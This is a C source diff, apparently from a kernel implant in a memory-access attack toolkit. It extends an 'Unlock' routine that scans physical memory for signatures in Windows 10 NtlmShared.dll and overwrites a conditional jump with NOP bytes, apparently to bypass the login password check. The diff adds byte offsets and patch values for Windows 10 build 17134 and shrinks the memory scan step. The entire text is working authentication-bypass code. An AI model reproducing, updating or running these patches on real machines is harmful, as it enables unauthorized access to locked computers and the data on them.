@@ -129,7 +129,7 @@ NTSTATUS Unlock_FindAndPatch(_In_ PKERNEL_FUNCTIONS2 fnk2, _Inout_ PBYTE pbPages
 	return E_FAIL;
 }
 
-#define NUMBER_OF_SIGNATURES 8
+#define NUMBER_OF_SIGNATURES 9
 NTSTATUS Unlock(_In_ QWORD qwAddrNtosBase)
 {
 	SIGNATURE oSigs[NUMBER_OF_SIGNATURES] = {
@@ -168,11 +168,16 @@ NTSTATUS Unlock(_In_ QWORD qwAddrNtosBase)
 			{ .cbOffset = 0x61e,.cb = 4,.pb = { 0x0f, 0x85, 0x2e, 0xfb } },
 			{ .cbOffset = 0x61e,.cb = 6,.pb = { 0x90, 0x90, 0x90, 0x90, 0x90, 0x90 } } }
 		},
-		{.chunk = { // win10x64 NtlmShared.dll (2017-09-29::10.0.16299.15)
+		{ .chunk = { // win10x64 NtlmShared.dll (2017-09-29::10.0.16299.15)
 			{ .cbOffset = 0x615,.cb = 4,.pb = { 0xff, 0x15, 0xd5, 0x1c } },
 			{ .cbOffset = 0x61e,.cb = 4,.pb = { 0x0f, 0x85, 0x2e, 0xfb } },
 			{ .cbOffset = 0x61e,.cb = 6,.pb = { 0x90, 0x90, 0x90, 0x90, 0x90, 0x90 } } }
-		}
+		},
+        { .chunk = { // win10x64 NtlmShared.dll (2018-04-11::10.0.17134.1)
+            { .cbOffset = 0x695,.cb = 4,.pb = { 0xff, 0x15, 0x55, 0x1c } },
+            { .cbOffset = 0x69e,.cb = 4,.pb = { 0x0f, 0x85, 0x2e, 0xfb } },
+            { .cbOffset = 0x69e,.cb = 6,.pb = { 0x90, 0x90, 0x90, 0x90, 0x90, 0x90 } } }
+        }
 	};
 	KERNEL_FUNCTIONS2 fnk2;
 	PPHYSICAL_MEMORY_RANGE pMemMap, pMM;
@@ -189,15 +194,15 @@ NTSTATUS Unlock(_In_ QWORD qwAddrNtosBase)
 	}
 	for(cMemMap = 0; pMemMap[cMemMap].BaseAddress || pMemMap[cMemMap].NumberOfBytes; cMemMap++);
 	// 3: Search memory and unlock if signature is found
-	while(qwBaseAddress + 0x100000 <= pMemMap[cMemMap - 1].BaseAddress + pMemMap[cMemMap - 1].NumberOfBytes) {
+	while(qwBaseAddress + 0x10000 <= pMemMap[cMemMap - 1].BaseAddress + pMemMap[cMemMap - 1].NumberOfBytes) {
 		for(i = 0; i < cMemMap; i++) {
 			pMM = &pMemMap[i];
-			if(((pMM->BaseAddress < qwBaseAddress) && (pMM->BaseAddress + pMM->NumberOfBytes > qwBaseAddress + 0x100000))) {
+			if(((pMM->BaseAddress < qwBaseAddress) && (pMM->BaseAddress + pMM->NumberOfBytes > qwBaseAddress + 0x10000))) {
 				// is inside range!
-				pvMemory = fnk2.MmMapIoSpace(qwBaseAddress, 0x100000, 0);
+				pvMemory = fnk2.MmMapIoSpace(qwBaseAddress, 0x10000, 0);
 				if(pvMemory) {
-					nt = Unlock_FindAndPatch(&fnk2, pvMemory, 0x100000 / 0x1000, oSigs, NUMBER_OF_SIGNATURES);
-					fnk2.MmUnmapIoSpace(pvMemory, 0x100000);
+					nt = Unlock_FindAndPatch(&fnk2, pvMemory, 0x10000 / 0x1000, oSigs, NUMBER_OF_SIGNATURES);
+					fnk2.MmUnmapIoSpace(pvMemory, 0x10000);
 					if(NT_SUCCESS(nt)) {
 						// found and patched! - exit!
 						goto cleanup;
@@ -206,7 +211,7 @@ NTSTATUS Unlock(_In_ QWORD qwAddrNtosBase)
 				break;
 			}
 		}
-		qwBaseAddress += 0x100000;
+		qwBaseAddress += 0x10000;
 	}
 	nt = E_FAIL;
 cleanup:
